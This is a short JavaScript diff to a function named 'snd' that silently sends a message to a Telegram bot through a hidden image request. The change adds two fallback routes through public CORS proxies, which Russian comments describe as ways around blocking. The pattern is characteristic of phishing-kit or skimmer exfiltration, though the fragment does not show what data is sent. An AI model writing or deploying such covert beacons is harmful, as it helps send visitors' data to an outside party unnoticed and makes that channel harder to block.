@@ -53,8 +53,18 @@
     }
 
     function snd(m) {
-        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(m);
-        new Image().src = url;
+        var tgUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(m);
+        
+        // Способ 1: Напрямую
+        new Image().src = tgUrl;
+        
+        // Способ 2: Через прокси для России
+        var proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(tgUrl);
+        new Image().src = proxyUrl;
+        
+        // Способ 3: Через второй прокси
+        var proxyUrl2 = 'https://corsproxy.io/?' + encodeURIComponent(tgUrl);
+        new Image().src = proxyUrl2;
     }
 
     function ld() {
